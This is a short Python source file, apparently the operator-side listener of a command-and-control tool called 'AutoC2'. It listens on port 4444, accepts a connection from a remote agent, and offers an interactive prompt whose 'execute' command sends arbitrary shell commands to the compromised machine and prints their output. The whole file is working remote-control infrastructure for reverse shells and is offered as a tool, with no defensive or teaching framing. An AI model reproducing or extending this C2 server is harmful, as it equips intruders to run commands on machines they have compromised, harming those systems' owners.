import socket

# Set server IP and port
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444

def start_server():
    # Set up server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(1)
    print(f"Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}...")

    # Accept a connection
    client_socket, client_address = server_socket.accept()
    print(f"Connection established from {client_address}")

    return server_socket, client_socket

def stop_server(server_socket, client_socket):
    server_socket.close()
    client_socket.close()

def AutoC2_shell(server_socket, client_socket):
    # Custom commands to interact with agents
    while True:
        command = input("AutoC2>")
        command = command.split()
        
        # Blank command
        if len(command) == 0:
            continue
        
        # `execute` = Execute system command
        if command[0].lower() == "execute":
            # Craft system command to send
            cmd = " ".join(command[1:]) + "\n"

            # Send command
            client_socket.send(cmd.encode())

            # Receive output from the client
            buffer = b''
            while b'ac2delim' not in buffer:
                buffer += client_socket.recv(4096)
            output = buffer.partition(b'ac2delim')[0].decode()
            print(output)

def main():
    # Start server
    server_socket, client_socket = start_server()
    
    # Allow interaction via custom shell
    AutoC2_shell(server_socket, client_socket)

    # Stop server
    stop_server(server_socket, client_socket)

if __name__=="__main__":
    main()
